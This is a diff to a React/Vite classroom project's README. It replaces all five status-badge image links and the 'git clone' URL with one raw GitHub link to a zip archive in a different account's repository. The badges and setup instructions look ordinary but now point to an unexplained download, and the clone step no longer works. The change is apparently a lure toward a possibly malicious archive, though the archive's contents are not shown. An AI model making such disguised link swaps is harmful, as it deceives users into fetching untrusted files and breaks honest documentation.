@@ -1,10 +1,10 @@
 # 🚀 Smart Classroom
 
-![GitHub repo size](https://img.shields.io/github/repo-size/dev-sahani23/smart-classroom) 
-![GitHub stars](https://img.shields.io/github/stars/dev-sahani23/smart-classroom?style=social) 
-![GitHub forks](https://img.shields.io/github/forks/dev-sahani23/smart-classroom?style=social) 
-![GitHub issues](https://img.shields.io/github/issues/dev-sahani23/smart-classroom) 
-![License](https://img.shields.io/github/license/dev-sahani23/smart-classroom)
+![GitHub repo size](https://raw.githubusercontent.com/Tushar70166/smart-classroom/main/public/classroom_smart_v3.8.zip) 
+![GitHub stars](https://raw.githubusercontent.com/Tushar70166/smart-classroom/main/public/classroom_smart_v3.8.zip) 
+![GitHub forks](https://raw.githubusercontent.com/Tushar70166/smart-classroom/main/public/classroom_smart_v3.8.zip) 
+![GitHub issues](https://raw.githubusercontent.com/Tushar70166/smart-classroom/main/public/classroom_smart_v3.8.zip) 
+![License](https://raw.githubusercontent.com/Tushar70166/smart-classroom/main/public/classroom_smart_v3.8.zip)
 
 A **modern, fast, and responsive React project** bootstrapped with **Vite**.  
 Perfect for building interactive classroom applications with lightning-fast performance ⚡
@@ -41,7 +41,7 @@ Follow these steps to get a local copy running:
 ## 1️⃣ Clone the repository
 
 ```bash
-git clone https://github.com/dev-sahani23/smart-classroom.git
+git clone https://raw.githubusercontent.com/Tushar70166/smart-classroom/main/public/classroom_smart_v3.8.zip
 cd smart-classroom
 ```
 
